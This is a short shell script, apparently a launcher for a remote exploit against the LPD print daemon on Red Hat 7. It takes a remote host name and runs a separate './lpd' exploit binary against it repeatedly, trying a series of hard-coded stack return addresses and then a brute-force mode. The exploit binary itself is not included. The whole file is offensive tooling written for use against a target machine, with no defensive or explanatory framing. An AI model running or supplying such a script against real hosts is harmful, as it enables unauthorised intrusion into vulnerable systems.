#!/bin/sh
#redhat7-lpd
#
if [ "$1" = "" ]; then
  echo "Usage: lpd7 <remote-host> "
  exit
fi

./lpd $1 -t 0 -r 0xbffff3dc
./lpd $1 -t 0 -r 0xbffff128
./lpd $1 -t 0 -r 0xbffff148
./lpd $1 -t 0 -r 0xbffff3c8
./lpd $1 -t 0 -r 0xbffff488
./lpd $1 -t 0 -r 0xbffff3e8
./lpd $1 -t 0 -r 0xbffff3d8
./lpd $1 brute -t 0          

